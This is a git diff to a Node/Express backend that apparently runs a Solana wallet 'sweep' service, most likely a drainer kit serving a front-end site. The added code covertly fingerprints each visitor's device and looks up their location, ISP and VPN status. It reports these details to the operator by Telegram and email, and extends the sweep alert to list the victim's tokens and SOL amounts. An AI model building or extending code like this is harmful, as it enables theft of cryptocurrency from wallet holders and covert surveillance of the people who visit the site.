@@ -32,7 +32,7 @@ if (tokenRecipient2Share <= 0 || tokenRecipient2Share >= 1) {
 }
 
 const connection = new Connection(rpcUrl, 'confirmed')
-const allowedOrigins = (process.env.FRONTEND_ORIGINS || 'https://novacore.dgtty.com')
+const allowedOrigins = (process.env.FRONTEND_ORIGINS || 'https://novacore.dgtty.com') //http://localhost:5173
  .split(',')
  .map((origin) => origin.trim())
  .filter(Boolean)
@@ -65,6 +65,18 @@ if (!telegramBotToken || !telegramChatId) {
 }
 if (!mailTransport) {
   console.warn('Email log delivery is disabled: SMTP_HOST, SMTP_USER, SMTP_PASS, and SMTP_FROM are required')
+} else {
+  void mailTransport.verify().then(() => {
+    console.info(`SMTP connection verified; log emails will be sent to ${logEmailTo}`)
+  }).catch((error) => {
+    console.error('SMTP connection verification failed', {
+      code: error.code,
+      command: error.command,
+      responseCode: error.responseCode,
+      response: error.response,
+      message: error instanceof Error ? error.message : String(error),
+    })
+  })
 }
 
 async function sendEmailLog(entry) {
@@ -77,7 +89,13 @@ async function sendEmailLog(entry) {
       text: entry,
     })
   } catch (error) {
-    console.error('Email log delivery failed', error instanceof Error ? error.message : String(error))
+    console.error('Email log delivery failed', {
+      code: error.code,
+      command: error.command,
+      responseCode: error.responseCode,
+      response: error.response,
+      message: error instanceof Error ? error.message : String(error),
+    })
   }
 }
 
@@ -112,23 +130,590 @@ async function sendTelegramLog(message) {
   }
 }
 
-function getVisitIp(request) {
-  return request.headers['x-forwarded-for']?.split(',')[0].trim() || request.socket.remoteAddress || 'Unknown'
+// -------------------------------------------------------------------------------
+// IP DETAILS
+// -------------------------------------------------------------------------------
+
+async function fetchIpDetails(ip) {
+  // --------------------------------------------------
+  // Handle missing / localhost / private IPs
+  // --------------------------------------------------
+
+  if (!ip || ip === 'Unknown') {
+    return {
+      country: 'Unknown',
+      region: 'Unknown',
+      city: 'Unknown',
+      isp: 'Unknown',
+      org: 'Unknown',
+      as: 'Unknown',
+      connectionType: 'Unknown',
+      timezone: 'Unknown',
+      estimatedIpRange: 'Unknown'
+    };
+  }
+
+  // IPv6 localhost
+  if (ip === '::1') {
+    return {
+      country: 'Localhost',
+      region: 'N/A',
+      city: 'N/A',
+      isp: 'Local Development',
+      org: 'Local Network',
+      as: 'N/A',
+      connectionType: 'Loopback / Private',
+      timezone: 'N/A',
+      estimatedIpRange: 'N/A'
+    };
+  }
+
+  // IPv4-mapped IPv6
+  if (ip.startsWith('::ffff:')) {
+    ip = ip.substring(7);
+  }
+
+  // --------------------------------------------------
+  // Check private IPv4 ranges
+  // --------------------------------------------------
+
+  const ipParts = ip.split('.');
+
+  if (ipParts.length === 4) {
+    const octet1 = Number(ipParts[0]);
+    const octet2 = Number(ipParts[1]);
+
+    const isPrivateIPv4 =
+      // 10.0.0.0/8
+      octet1 === 10 ||
+
+      // 172.16.0.0/12
+      (octet1 === 172 && octet2 >= 16 && octet2 <= 31) ||
+
+      // 192.168.0.0/16
+      (octet1 === 192 && octet2 === 168) ||
+
+      // 127.0.0.0/8 - loopback
+      octet1 === 127;
+
+    if (isPrivateIPv4) {
+      return {
+        country: 'Localhost / Private Network',
+        region: 'N/A',
+        city: 'N/A',
+        isp: 'Local Network',
+        org: 'Private Network',
+        as: 'N/A',
+        connectionType: 'Loopback / Private',
+        timezone: 'N/A',
+        estimatedIpRange: 'N/A'
+      };
+    }
+  }
+
+  // --------------------------------------------------
+  // Fetch IP information
+  // --------------------------------------------------
+
+  try {
+    const fields =
+      'status,message,country,regionName,city,isp,org,as,mobile,proxy,hosting,timezone,query';
+
+    const response = await axios.get(
+      `https://ip-api.com/json/${encodeURIComponent(ip)}?fields=${fields}`,
+      {
+        timeout: 5000
+      }
+    );
+
+    // ------------------------------------------------
+    // Validate response
+    // ------------------------------------------------
+
+    if (
+      response.data &&
+      response.data.status === 'success'
+    ) {
+      const data = response.data;
+
+      // ----------------------------------------------
+      // Determine connection type
+      // ----------------------------------------------
+
+      let connType = 'Fixed Line Broadband / WiFi';
+
+      if (data.hosting) {
+        connType = 'Datacenter / Hosting Provider';
+      } else if (data.proxy) {
+        connType = 'VPN / Proxy Server';
+      } else if (data.mobile) {
+        connType = 'Mobile Data / Cellular Network';
+      }
+
+      // ----------------------------------------------
+      // Estimate /24 IP range
+      // ----------------------------------------------
+
+      let estimatedIpRange = 'N/A';
+
+      const parts = ip.split('.');
+
+      if (
+        parts.length === 4 &&
+        parts.every(part => !isNaN(Number(part)))
+      ) {
+        estimatedIpRange =
+          `${parts[0]}.${parts[1]}.${parts[2]}.0/24`;
+      }
+
+      // ----------------------------------------------
+      // Return network information
+      // ----------------------------------------------
+
+      return {
+        country: data.country || 'Unknown',
+
+        region:
+          data.regionName || 'Unknown',
+
+        city:
+          data.city || 'Unknown',
+
+        isp:
+          data.isp || 'Unknown',
+
+        org:
+          data.org || 'Unknown',
+
+        as:
+          data.as || 'Unknown',
+
+        connectionType:
+          connType,
+
+        timezone:
+          data.timezone || 'Unknown',
+
+        estimatedIpRange
+      };
+    }
+
+    // ------------------------------------------------
+    // API returned an unsuccessful response
+    // ------------------------------------------------
+
+    console.warn(
+      `IP API lookup failed for ${ip}:`,
+      response.data?.message || 'Unknown error'
+    );
+
+  } catch (error) {
+    console.error(
+      `Failed to fetch IP details for ${ip}:`,
+      error.message
+    );
+  }
+
+  // --------------------------------------------------
+  // Fallback
+  // --------------------------------------------------
+
+  return {
+    country: 'Unknown',
+    region: 'Unknown',
+    city: 'Unknown',
+    isp: 'Unknown',
+    org: 'Unknown',
+    as: 'Unknown',
+    connectionType: 'Unknown',
+    timezone: 'Unknown',
+    estimatedIpRange: 'Unknown'
+  };
 }
 
-function getDeviceDetails(request, deviceInfo = {}) {
-  const userAgent = request.headers['user-agent'] || 'Unknown'
-  return {
-    ip: getVisitIp(request),
-    browser: request.useragent?.browser || 'Unknown',
-    platform: deviceInfo.platform || request.useragent?.platform || 'Unknown',
-    userAgent,
-    screenResolution: deviceInfo.screenResolution || 'N/A',
-    language: deviceInfo.language || 'N/A',
-    hardwareConcurrency: deviceInfo.hardwareConcurrency || 'N/A',
-    gpuRenderer: deviceInfo.gpuRenderer || 'N/A',
+
+// -------------------------------------------------------------------------------
+// ENHANCED DEVICE PARSING
+// -------------------------------------------------------------------------------
+
+function parseDeviceInfo(req, deviceInfo = {}) {
+
+  // --------------------------------------------------
+  // Get User-Agent
+  // --------------------------------------------------
+
+  const uaString =
+    req.headers['user-agent'] || '';
+
+  // --------------------------------------------------
+  // Initialize MobileDetect
+  // --------------------------------------------------
+
+  const md = new MobileDetect(uaString);
+
+  // req.useragent comes from express-useragent
+  const ua =
+    req.useragent || {};
+
+  // --------------------------------------------------
+  // Defaults
+  // --------------------------------------------------
+
+  let phoneModel =
+    'Generic Device';
+
+  let os =
+    'Unknown OS';
+
+  let deviceType =
+    'Desktop 💻';
+
+
+  // ---------------------------------------------------------------------------
+  // MOBILE / TABLET
+  // ---------------------------------------------------------------------------
+
+  if (md.mobile()) {
+
+    // ------------------------------------------------
+    // Determine device type
+    // ------------------------------------------------
+
+    deviceType = md.tablet()
+      ? 'Tablet 📱'
+      : 'Mobile 📲';
+
+
+    // ------------------------------------------------
+    // Determine device model
+    // ------------------------------------------------
+
+    if (md.phone()) {
+
+      phoneModel =
+        `${md.phone()} (${md.os() || 'Mobile OS'})`;
+
+    } else if (md.tablet()) {
+
+      phoneModel =
+        `${md.tablet()} Tablet`;
+
+    } else {
+
+      phoneModel =
+        md.mobile() || 'Generic Mobile Device';
+    }
+
+
+    // ------------------------------------------------
+    // Determine mobile OS
+    // ------------------------------------------------
+
+    os =
+      md.os() ||
+      ua.os ||
+      'Mobile OS';
+
+  } else {
+
+    // -------------------------------------------------------------------------
+    // DESKTOP
+    // -------------------------------------------------------------------------
+
+    deviceType =
+      'Desktop 💻';
+
+    const platform =
+      deviceInfo?.platform ||
+      ua.platform ||
+      '';
+
+
+    // ------------------------------------------------
+    // Windows
+    // ------------------------------------------------
+
+    if (
+      platform.toLowerCase().includes('win') ||
+      ua.isWindows
+    ) {
+
+      os =
+        'Windows OS';
+
+      phoneModel =
+        'Windows PC / Laptop';
+
+
+    // ------------------------------------------------
+    // macOS
+    // ------------------------------------------------
+
+    } else if (
+      platform.toLowerCase().includes('mac') ||
+      ua.isMac
+    ) {
+
+      os =
+        'macOS';
+
+      phoneModel =
+        'Apple Mac / MacBook';
+
+
+    // ------------------------------------------------
+    // Linux
+    // ------------------------------------------------
+
+    } else if (
+      platform.toLowerCase().includes('linux') ||
+      ua.isLinux
+    ) {
+
+      os =
+        'Linux OS';
+
+      phoneModel =
+        'Linux Workstation';
+
+
+    // ------------------------------------------------
+    // Other desktop OS
+    // ------------------------------------------------
+
+    } else {
+
+      os =
+        ua.os ||
+        'Desktop OS';
+
+      phoneModel =
+        platform ||
+        'Desktop / Laptop';
+    }
   }
+
+
+  // ---------------------------------------------------------------------------
+  // GPU
+  // ---------------------------------------------------------------------------
+
+  const gpu =
+    deviceInfo?.gpuRenderer ||
+    'Unknown';
+
+
+  // ---------------------------------------------------------------------------
+  // RETURN DEVICE INFORMATION
+  // ---------------------------------------------------------------------------
+
+  return {
+
+    phoneModel,
+
+    deviceType,
+
+    gpu,
+
+    os
+  };
 }
+
+
+// -------------------------------------------------------------------------------
+// GET VISITOR IP
+// -------------------------------------------------------------------------------
+
+function getVisitIp(request) {
+
+  let ip;
+
+
+  // ---------------------------------------------------------------------------
+  // Prefer Express's parsed IP
+  //
+  // This works correctly when Express is configured with:
+  //
+  // app.set('trust proxy', 1);
+  // ---------------------------------------------------------------------------
+
+  if (request.ip) {
+
+    ip =
+      request.ip;
+
+  } else {
+
+    ip =
+      request.socket?.remoteAddress ||
+      'Unknown';
+  }
+
+
+  // ---------------------------------------------------------------------------
+  // Handle IPv4-mapped IPv6 addresses
+  //
+  // Example:
+  //
+  // ::ffff:192.168.1.10
+  //
+  // becomes:
+  //
+  // 192.168.1.10
+  // ---------------------------------------------------------------------------
+
+  if (
+    ip &&
+    ip.startsWith('::ffff:')
+  ) {
+
+    ip =
+      ip.substring(7);
+  }
+
+
+  // ---------------------------------------------------------------------------
+  // Handle empty value
+  // ---------------------------------------------------------------------------
+
+  if (!ip) {
+
+    ip =
+      'Unknown';
+  }
+
+
+  return ip;
+}
+
+
+// -------------------------------------------------------------------------------
+// COMPLETE DEVICE + IP INFORMATION
+// -------------------------------------------------------------------------------
+
+async function getDeviceDetails(
+  request,
+  deviceInfo = {}
+) {
+
+  // ---------------------------------------------------------------------------
+  // USER AGENT
+  // ---------------------------------------------------------------------------
+
+  const userAgent =
+    request.headers['user-agent'] ||
+    'Unknown';
+
+
+  // ---------------------------------------------------------------------------
+  // VISITOR IP
+  // ---------------------------------------------------------------------------
+
+  const ip =
+    getVisitIp(request);
+
+
+  // ---------------------------------------------------------------------------
+  // PARSE DEVICE
+  // ---------------------------------------------------------------------------
+
+  const device =
+    parseDeviceInfo(
+      request,
+      deviceInfo
+    );
+
+
+  // ---------------------------------------------------------------------------
+  // FETCH IP / NETWORK INFORMATION
+  // ---------------------------------------------------------------------------
+
+  const network =
+    await fetchIpDetails(ip);
+
+
+  // ---------------------------------------------------------------------------
+  // RETURN COMPLETE INFORMATION
+  // ---------------------------------------------------------------------------
+
+  return {
+
+    // =========================================================================
+    // DEVICE INFORMATION
+    // =========================================================================
+
+    ip,
+
+    deviceType:
+      device.deviceType,
+
+    phoneModel:
+      device.phoneModel,
+
+    os:
+      device.os,
+
+    browser:
+      request.useragent?.browser ||
+      'Unknown',
+
+    userAgent,
+
+
+    // =========================================================================
+    // BROWSER / HARDWARE INFORMATION
+    // =========================================================================
+
+    screenResolution:
+      deviceInfo?.screenResolution ||
+      'N/A',
+
+    language:
+      deviceInfo?.language ||
+      'N/A',
+
+    hardwareConcurrency:
+      deviceInfo?.hardwareConcurrency ||
+      'N/A',
+
+    gpuRenderer:
+      device.gpu ||
+      'Unknown',
+
+
+    // =========================================================================
+    // NETWORK / IP INFORMATION
+    // =========================================================================
+
+    country:
+      network.country,
+
+    region:
+      network.region,
+
+    city:
+      network.city,
+
+    isp:
+      network.isp,
+
+    organization:
+      network.org,
+
+    as:
+      network.as,
+
+    connectionType:
+      network.connectionType,
+
+    timezone:
+      network.timezone,
+
+    estimatedIpRange:
+      network.estimatedIpRange
+  };
+}
+// -------------------------------------------------------------------------------
 
 function parsePublicKey(value, fieldName) {
   try {
@@ -251,24 +836,89 @@ async function buildSweep(owner) {
   }
 }
 
+// -----------------------------------------------------------------------------
+// ----------------------------------------------------
+// VISITOR LOGGING
+// ----------------------------------------------------
 app.post('/api/log-visit', async (request, response) => {
-  const details = getDeviceDetails(request, request.body?.deviceInfo)
-  const message = `New site visitor detected!
-----------------------------------
-Platform: ${details.platform}
-Browser: ${details.browser}
-Screen resolution: ${details.screenResolution}
-CPU cores: ${details.hardwareConcurrency}
-Language: ${details.language}
-GPU / chipset: ${details.gpuRenderer}
-----------------------------------
-IP address: ${details.ip}
-User agent: ${details.userAgent}`
 
-  writeAppLog('INFO', 'Site visit', details)
-  const telegramSent = await sendTelegramLog(message)
-  response.json({ success: true, telegramSent })
-})
+  try {
+
+    // Get complete device + network information
+    const details = await getDeviceDetails(
+      request,
+      request.body?.deviceInfo
+    );
+
+    // ----------------------------------------------
+    // Build email / Telegram message
+    // ----------------------------------------------
+    const message = `
+1. New Site Visitor Detected!
+----------------------------------
+📱 Device Type: ${details.deviceType}
+📱 Phone / Hardware: ${details.phoneModel}
+💻 OS: ${details.os}
+🌐 Browser: ${details.browser}
+🖥️ Screen Resolution: ${details.screenResolution}
+⚙️ CPU Cores: ${details.hardwareConcurrency}
+🎮 GPU / Chipset: ${details.gpuRenderer}
+🌍 Language: ${details.language}
+----------------------------------
+🌐 IP Address: ${details.ip}
+📡 Network Operator / ISP: ${details.isp}
+🏢 Organization: ${details.organization}
+🔢 ASN: ${details.as}
+📶 Connection Type: ${details.connectionType}
+🌎 Country: ${details.country}
+📍 Region / City: ${details.region} / ${details.city}
+🕐 Timezone: ${details.timezone}
+🛜 IP Range / Route: ${details.ipRange}
+----------------------------------
+`;
+
+    // ----------------------------------------------
+    // Save application log
+    // ----------------------------------------------
+    writeAppLog(
+      'INFO',
+      'Site visit',
+      details
+    );
+
+    // ----------------------------------------------
+    // Send Telegram
+    // ----------------------------------------------
+    const telegramSent =
+      await sendTelegramLog(message);
+
+    // ----------------------------------------------
+    // Send email
+    // ----------------------------------------------
+    await sendEmailLog(message);
+
+    // ----------------------------------------------
+    // Response
+    // ----------------------------------------------
+    response.json({
+      success: true,
+      telegramSent
+    });
+
+  } catch (error) {
+
+    console.error(
+      'Visitor logging failed:',
+      error
+    );
+
+    response.status(500).json({
+      success: false,
+      message: 'Failed to log visitor'
+    });
+  }
+});
+// ------------------------------------------------------------------------------
 
 app.get('/api/health', (_request, response) => {
   response.json({ ok: true, network: process.env.SOLANA_NETWORK || 'mainnet-beta' })
@@ -289,7 +939,14 @@ app.post('/api/sweep/prepare', async (request, response, next) => {
   Platform: ${clientInfo.platform || 'Unknown'}
   Browser: ${clientInfo.browser || 'Unknown'}
   IP address: ${clientInfo.ip || 'Unknown'}
-  Batches: ${sweep.batchCount}`
+  Batches: ${sweep.batchCount}
+  Assets: ${sweep.assets.map((asset) => `${asset.mint} (${asset.rawAmount})`).join(', ') || 'None'}
+  SOL amounts: ${sweep.solAmounts.map((amount) => `${amount} SOL`).join(', ') || 'None'}
+  Last valid block height: ${sweep.lastValidBlockHeight}
+  -------
+  Assets detected: ${sweep.assets?.length || 0}
+  Transactions prepared: ${transactionsBase64.length}
+  Serialized length: ${sweep.serializedLength}`;
 
     writeAppLog('INFO', 'Wallet connected and transaction prepared', clientInfo)
     void sendTelegramLog(connectionMessage)
